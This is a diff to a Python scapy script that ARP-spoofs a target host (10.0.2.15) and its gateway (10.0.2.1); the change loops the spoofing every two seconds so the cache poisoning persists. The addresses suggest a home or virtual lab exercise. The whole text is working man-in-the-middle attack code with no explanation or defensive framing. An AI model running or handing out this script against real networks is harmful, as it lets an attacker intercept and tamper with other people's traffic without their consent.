@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
 
 target_ip="10.0.2.15"
 gateway_ip = "10.0.2.1"
@@ -19,5 +20,7 @@ def spoof(target_ip, spoof_ip):
     print(packet.summary())
     scapy.send(packet)
 
-spoof(target_ip, gateway_ip)
-spoof(gateway_ip, target_ip)
+while True:
+    spoof(target_ip, gateway_ip)
+    spoof(gateway_ip, target_ip)
+    time.sleep(2)
